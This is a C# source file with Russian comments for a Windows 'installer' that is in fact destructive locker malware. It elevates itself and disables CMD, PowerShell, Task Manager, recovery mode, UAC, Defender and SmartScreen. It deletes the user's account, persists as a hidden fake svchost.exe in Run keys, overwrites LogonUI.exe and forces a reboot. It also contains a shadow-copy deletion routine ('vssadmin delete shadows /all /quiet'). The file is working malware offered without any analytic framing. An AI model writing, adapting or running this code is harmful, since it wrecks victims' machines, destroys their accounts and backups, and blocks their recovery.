// installer.cs - Полная версия, правильный порядок
using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace LogonUIInstaller
{
    class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetPriorityClass(IntPtr hProcess, uint dwPriorityClass);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const uint HIGH_PRIORITY_CLASS = 0x00000080;
        private const int SW_HIDE = 0;
        private static string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";

        static void Main(string[] args)
        {
            IntPtr consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero) ShowWindow(consoleWindow, SW_HIDE);

            try
            {
                // 1. ЗАПРОС ПРАВ АДМИНИСТРАТОРА
                if (!IsAdministrator())
                {
                    RunAsAdministrator();
                    return;
                }

                SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

                // 2. БЛОКИРОВКИ (CMD, PowerShell, VBS, WinRE, Win+L, Ctrl+Alt+Del, Safe Mode, USB, диски, обои, пользователи)
                ApplySystemBlocks();

                // 3. ЗАМЕНА ОБОЕВ И КУРСОРОВ
                ReplaceWallpaperAndCursors();

                // 4. ОТКЛЮЧЕНИЕ АНТИВИРУСОВ И UAC
                DisableAntivirusAndUAC();

                // 5. УДАЛЕНИЕ ПОЛЬЗОВАТЕЛЯ И СОЗДАНИЕ НОВОГО
                ReplaceUserAccount();

                // 6. АВТОЗАГРУЗКА (СКРЫТАЯ, ТОЛЬКО ЧТЕНИЕ)
                AddToStartup();

                // 7. ПЕРЕЗАПИСЬ LogonUI.exe (БЕЗ BSOD, БЕЗ ЗАПУСКА)
                ReplaceLogonUI();

                // 8. ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА (ПОСЛЕ ВСЕХ БЛОКИРОВОК)
                ForceReboot();
            }
            catch (Exception ex)
            {
                try { File.WriteAllText(@"C:\Windows\Temp\~installer_error.log", ex.ToString()); } catch { }
                Environment.Exit(1);
            }
        }

        private static void ForceReboot()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown",
                    Arguments = "/r /f /t 0",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
            }
            catch { }
            Environment.Exit(0);
        }

        private static bool IsAdministrator()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void RunAsAdministrator()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = Assembly.GetEntryAssembly().Location,
                    UseShellExecute = true,
                    Verb = "runas",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
            Environment.Exit(0);
        }

        private static void ApplySystemBlocks()
        {
            try
            {
                // Блокировка CMD
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                {
                    key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                {
                    key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
                }

                // Блокировка PowerShell
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                {
                    key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                {
                    key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
                }

                // Блокировка VBS
                using (var key = Registry.ClassesRoot.CreateSubKey(@".vbs"))
                {
                    key.SetValue("", "txtfile", RegistryValueKind.String);
                }
                using (var key = Registry.ClassesRoot.CreateSubKey(@".vbe"))
                {
                    key.SetValue("", "txtfile", RegistryValueKind.String);
                }

                // Блокировка WinRE и безопасного режима
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Recovery"))
                {
                    key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot"))
                {
                    key.SetValue("OptionValue", 1, RegistryValueKind.DWord);
                }

                // Блокировка Win+L
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                }

                // Блокировка Ctrl+Alt+Del
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                }

                // Запрет загрузки с USB
                using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManager"))
                {
                    key.SetValue("BootMenuPolicy", 1, RegistryValueKind.DWord);
                    key.SetValue("DisplayBootMenu", 0, RegistryValueKind.DWord);
                }

                // Скрытие всех дисков из проводника
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                }

                // Запрет изменения обоев
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
                }

                // Запрет создания новых пользователей (не UAC, отдельно)
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void DisableAntivirusAndUAC()
        {
            try
            {
                // Отключение UAC
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                    key.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
                    key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                }

                // Отключение Defender и антивирусов
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
                {
                    key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void DestroySystemBackups()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "vssadmin",
                    Arguments = "delete shadows /all /quiet",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });

                Process.Start(new ProcessStartInfo
                {
                    FileName = "reg",
                    Arguments = "add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
            }
            catch { }
        }

        private static void ReplaceWallpaperAndCursors()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string targetDir = Path.Combine(appData, "SystemUpdate");
                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);

                ExtractResource("wd.webp", Path.Combine(targetDir, "wd.webp"));
                ExtractResource("fg.ani", Path.Combine(targetDir, "fg.ani"));

                using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop"))
                {
                    key.SetValue("Wallpaper", Path.Combine(targetDir, "wd.webp"), RegistryValueKind.String);
                    key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
                    key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
                }

                string cursorPath = Path.Combine(targetDir, "fg.ani");
                using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors"))
                {
                    key.SetValue("Arrow", cursorPath, RegistryValueKind.String);
                    key.SetValue("Help", cursorPath, RegistryValueKind.String);
                    key.SetValue("AppStarting", cursorPath, RegistryValueKind.String);
                    key.SetValue("Wait", cursorPath, RegistryValueKind.String);
                    key.SetValue("Crosshair", cursorPath, RegistryValueKind.String);
                    key.SetValue("IBeam", cursorPath, RegistryValueKind.String);
                    key.SetValue("NWPen", cursorPath, RegistryValueKind.String);
                    key.SetValue("No", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNS", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeWE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNWSE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNESW", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeAll", cursorPath, RegistryValueKind.String);
                    key.SetValue("UpArrow", cursorPath, RegistryValueKind.String);
                }
            }
            catch { }
        }

        private static void ReplaceUserAccount()
        {
            try
            {
                string currentUser = Environment.UserName;
                string newUser = "CLOSE YOUR EYES";

                Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = $"user {currentUser} /delete /y",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });

                Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = $"user \"{newUser}\" /add /active:yes",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });

                string[] groups = { "Administrators", "Users", "Guests", "Power Users" };
                foreach (string group in groups)
                {
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "net",
                            Arguments = $"localgroup {group} \"{newUser}\" /delete",
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            UseShellExecute = false
                        });
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static void AddToStartup()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string targetDir = Path.Combine(appData, "SystemUpdate");
                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);

                string selfPath = Assembly.GetEntryAssembly().Location;
                string destPath = Path.Combine(targetDir, "svchost.exe");
                if (File.Exists(selfPath) && !File.Exists(destPath))
                {
                    File.Copy(selfPath, destPath, true);
                }

                File.SetAttributes(destPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                File.SetAttributes(targetDir, FileAttributes.Hidden | FileAttributes.ReadOnly);

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                {
                    key.SetValue("SystemUpdate", destPath, RegistryValueKind.String);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                {
                    key.SetValue("SystemUpdate", destPath, RegistryValueKind.String);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
                {
                    key.SetValue("SystemUpdate", destPath, RegistryValueKind.String);
                }
            }
            catch { }
        }

        private static void ReplaceLogonUI()
        {
            try
            {
                string originalPath = FindLogonUI();
                if (string.IsNullOrEmpty(originalPath) || !File.Exists(originalPath))
                {
                    originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
                }

                if (!File.Exists(originalPath)) return;

                ForceFullAccess(originalPath);
                KillLogonUIProcesses();

                File.SetAttributes(originalPath, FileAttributes.Normal);
                for (int i = 0; i < 5; i++)
                {
                    try
                    {
                        File.Delete(originalPath);
                        break;
                    }
                    catch
                    {
                        System.Threading.Thread.Sleep(1000);
                        try
                        {
                            File.Move(originalPath, originalPath + ".del");
                            File.Delete(originalPath + ".del");
                            break;
                        }
                        catch { }
                    }
                }

                byte[] customLogonUI = ExtractResource("LogonUI.exe");
                File.WriteAllBytes(originalPath, customLogonUI);
            }
            catch { }
        }

        private static void ForceFullAccess(string path)
        {
            try
            {
                File.SetAttributes(path, FileAttributes.Normal);
            }
            catch { }

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{path}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                if (p != null) { p.WaitForExit(3000); p.Close(); }
            }
            catch { }

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{path}\" /grant Everyone:F",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                if (p != null) { p.WaitForExit(3000); p.Close(); }
            }
            catch { }

            try
            {
                FileInfo fi = new FileInfo(path);
                FileSecurity fs = fi.GetAccessControl();
                fs.SetOwner(WindowsIdentity.GetCurrent().User);
                fs.AddAccessRule(new FileSystemAccessRule(
                    new NTAccount(Environment.UserDomainName, Environment.UserName),
                    FileSystemRights.FullControl, AccessControlType.Allow));
                fs.AddAccessRule(new FileSystemAccessRule(
                    new NTAccount("NT AUTHORITY\\SYSTEM"),
                    FileSystemRights.FullControl, AccessControlType.Allow));
                fi.SetAccessControl(fs);
            }
            catch { }
        }

        private static string FindLogonUI()
        {
            string[] paths = {
                @"C:\Windows\System32\LogonUI.exe",
                @"C:\WINDOWS\System32\LogonUI.exe",
                @"C:\Windows\system32\LogonUI.exe",
                Environment.ExpandEnvironmentVariables(@"%SystemRoot%\System32\LogonUI.exe")
            };
            foreach (string p in paths)
            {
                try { if (File.Exists(p)) return p; } catch { }
            }
            return null;
        }

        private static void KillLogonUIProcesses()
        {
            try
            {
                foreach (Process p in Process.GetProcessesByName("LogonUI"))
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(p.MainModule.FileName) &&
                            p.MainModule.FileName.Contains("System32"))
                        {
                            p.Kill();
                            p.WaitForExit(3000);
                            System.Threading.Thread.Sleep(500);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static void ExtractResource(string name, string outputPath)
        {
            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
                {
                    if (stream == null) return;
                    byte[] data = new byte[stream.Length];
                    stream.Read(data, 0, data.Length);
                    File.WriteAllBytes(outputPath, data);
                    File.SetAttributes(outputPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                }
            }
            catch { }
        }

        private static byte[] ExtractResource(string resourceName)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            using (Stream stream = assembly.GetManifestResourceStream(resourceName) ??
                  assembly.GetManifestResourceStream($"LogonUIInstaller.{resourceName}"))
            {
                if (stream == null) throw new Exception($"Resource {resourceName} not found");
                byte[] data = new byte[stream.Length];
                stream.Read(data, 0, data.Length);
                return data;
            }
        }
    }
}